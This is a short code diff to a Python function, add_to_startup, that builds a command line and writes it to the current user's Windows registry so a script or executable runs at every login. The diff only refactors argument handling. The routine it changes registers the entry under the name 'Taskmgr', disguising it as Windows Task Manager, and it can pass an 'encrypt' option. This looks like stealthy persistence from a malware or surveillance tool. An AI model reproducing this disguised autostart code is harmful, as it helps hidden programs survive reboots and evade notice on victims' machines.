@@ -67,11 +67,13 @@ def add_to_startup(mode, encryption_on, executable):
     key2change = OpenKey(HKEY_CURRENT_USER,
                          key_val, 0, KEY_ALL_ACCESS)
     if executable:
+        sys_args = ' '.join(['exe', mode, 'startup'])
         reg_value_prefix, reg_value_postfix = '', ''
     else:
+        sys_args = ' '.join([mode, 'startup'])
         reg_value_prefix = 'CMD /k "cd ' + dir_path + ' && ' + PYTHON_EXEC_PATH + ' '
         reg_value_postfix = '"'
-    reg_value = reg_value_prefix + '"' + current_file_path + '" ' + ' '.join([mode, 'startup']) + \
+    reg_value = reg_value_prefix + '"' + current_file_path + '" ' + sys_args + \
                 (' encrypt' if encryption_on else '') + reg_value_postfix
     try:
         SetValueEx(key2change, "Taskmgr", 0, REG_SZ, reg_value)
